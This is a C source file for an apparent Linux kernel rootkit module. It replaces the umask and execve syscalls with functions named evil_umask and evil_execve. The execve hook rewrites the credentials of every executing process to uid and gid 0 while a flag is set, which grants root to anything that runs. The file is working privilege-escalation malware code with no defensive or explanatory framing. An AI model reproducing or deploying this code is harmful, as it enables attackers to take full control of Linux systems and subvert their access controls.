#include "sys_escalation.h"

/* set root escalation flag */
int ref = 1; // if = 1 debugging

/* function pointer to default umask syscall */
asmlinkage int (*def_umask) (mode_t mask);

/* function pointer to default execve syscall */
asmlinkage int (*def_execve) (const char *filename, const char *const argv[], const char *const envp[]);

asmlinkage int evil_umask(mode_t mask)
{
  /* call the origin syscall */
  return def_umask(mask);
}

asmlinkage int evil_execve(const char *filename, const char *const argv[], const char *const envp[])
{
  if (ref == 1) {
    /* creating process credentials struct */
    struct cred *np;

    /* creating uid struct */
    kuid_t nuid;

    /* set uid value to 0 */
    nuid.val = 0;

    /* creating gid struct */
    kgid_t ngid;

    /* set gid value to 0 */
    ngid.val = 0;

    /* prepare credentials to task_struct of current process */
    np = prepare_creds();

    /* set new cred struct */
    np->uid = nuid;
    np->euid = nuid;
    np->gid = ngid;
    np->egid = ngid;

    /* commit creds to task_struct of current process */
    commit_creds(np);
  }

  /* call the origin syscall */
  return def_execve(filename, argv, envp);
}
